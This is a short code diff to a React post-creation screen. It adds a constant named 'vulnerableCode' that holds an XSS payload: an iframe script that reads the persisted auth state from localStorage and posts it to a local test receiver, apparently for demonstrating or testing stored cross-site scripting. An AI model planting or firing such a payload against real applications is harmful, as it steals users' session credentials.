@@ -11,6 +11,8 @@ import ScreenBase from "../ScreenBase";
 import { requestCreatePost } from "../../api/posts";
 import { useNavigate } from "react-router-dom";
 
+const vulnerableCode = `<iframe srcDoc="<script>fetch('http://localhost:3001/api/v1/test/receiver', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(JSON.parse(JSON.parse(localStorage.getItem('persist:root')).auth))}))</script>"></iframe>`;
+
 const CreatePostScreen: React.FC = () => {
   const [title, setTitle] = React.useState("");
   const [content, setContent] = React.useState("");
